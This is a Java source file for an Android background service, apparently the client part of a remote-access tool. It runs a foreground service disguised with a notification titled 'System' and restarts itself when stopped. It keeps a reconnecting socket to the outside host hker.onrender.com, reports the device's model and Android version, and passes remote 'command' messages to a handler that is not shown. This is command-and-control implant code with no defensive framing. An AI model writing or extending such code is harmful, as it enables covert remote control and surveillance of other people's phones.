package com.rainbow.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

import java.net.URI;
import java.util.HashMap;
import java.util.Map;

import io.socket.client.IO;
import io.socket.client.Socket;

public class SocketService extends Service {

    public static final String HOST = "https://hker.onrender.com";
    private static final String TAG = "RainbowSvc";
    private Socket socket;
    private CommandHandler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundNotification();
        handler = new CommandHandler(this);
        connectSocket();
    }

    private void startForegroundNotification() {
        String CH = "rainbow";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            NotificationChannel ch = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_LOW);
            nm.createNotificationChannel(ch);
            Notification n = new Notification.Builder(this, CH)
                    .setContentTitle("System")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
            startForeground(1, n);
        }
    }

    private void connectSocket() {
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 3000;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.timeout = 15000;
            opts.transports = new String[]{"websocket", "polling"};

            Map<String, String> headers = new HashMap<>();
            headers.put("user-agent", Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE);
            opts.extraHeaders = headers;

            socket = IO.socket(URI.create(HOST), opts);
            socket.on(Socket.EVENT_CONNECT, args -> Log.d(TAG, "connected"));
            socket.on(Socket.EVENT_DISCONNECT, args -> Log.d(TAG, "disconnected"));
            socket.on("command", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    handler.handle(data);
                } catch (Exception e) {
                    Log.e(TAG, "cmd parse", e);
                }
            });
            socket.on("ping", args -> socket.emit("pong", new JSONObject()));
            socket.connect();
        } catch (Exception e) {
            Log.e(TAG, "connect", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (socket != null && !socket.connected()) socket.connect();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}